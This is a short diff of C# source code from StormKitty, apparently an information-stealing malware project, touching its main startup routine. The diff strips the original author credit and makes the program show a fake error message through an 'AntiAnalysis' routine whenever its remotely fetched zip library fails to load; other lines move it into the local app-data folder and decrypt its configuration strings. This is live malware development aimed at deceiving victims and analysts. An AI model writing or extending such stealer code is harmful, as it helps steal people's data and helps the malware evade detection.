@@ -1,9 +1,4 @@
-﻿/* 
-    Author : LimerBoy
-    Github : github.com/LimerBoy/StormKitty
-*/
-
-using Stealer;
+﻿using Stealer;
 using System;
 using System.Net;
 using System.Threading;
@@ -47,7 +42,8 @@ namespace StormKitty
             System.IO.Directory.SetCurrentDirectory(Paths.lappdata);
 
             // Load SharpZipLib
-            Libs.LoadRemoteLibrary(Libs.ZipLib);
+            if (!Libs.LoadRemoteLibrary(Libs.ZipLib))
+                Implant.AntiAnalysis.FakeErrorMessage();
 
             // Decrypt config strings
             Config.Init();
